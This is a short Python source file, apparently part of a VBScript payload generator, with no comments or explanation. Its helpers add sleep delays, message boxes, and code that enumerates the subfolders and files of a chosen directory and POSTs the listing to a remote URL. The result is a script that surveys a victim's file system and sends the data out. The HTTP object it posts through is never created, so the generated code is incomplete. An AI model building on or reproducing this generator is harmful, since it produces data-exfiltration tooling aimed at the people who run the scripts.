#coding=utf-8
def add_sleep(origin, time):
    try:
        return "%sWScript.Sleep %d\n"%(origin, time)
    except Exception as e:
        return origin+"WScript.Sleep 10000\n"

def add_msgbox(origin, msg):
    try:
        return "%sMsgBox \"%s\"\n"%(origin, msg)
    except Exception as e :
        return origin+"MsgBox \" \"\n"

def add_post(origin, url, objn):
    try:
        return "%sA.open \"POST\", \"%s\", False\n"%(origin, url) + \
            "A.send %s"%objn
    except Exception as e:
        return origin

def add_post_folder(origin, url, path):
    try:
        ret = "%sret=\"\"\n"%origin +\
            "Set fso=CreateObject(\"Scripting.FileSystemObject\")\n" +\
            "Set getfso=fso.GetFolder(\"%s\\\")\n"%path +\
            "For Each subfoler in getfso.SubFolders\n" +\
            "ret=ret&\"d-\"&subfoler.name&\",\"\nNext\n" +\
            "For Each file in getfso.FiLes\n" +\
            "ret=ret&\"f-\"&file.name&\",\"\nNext\n"
        ret = add_post(ret, url, "ret")
        return ret
    except Exception as e:
        print(e.message)
        return origin

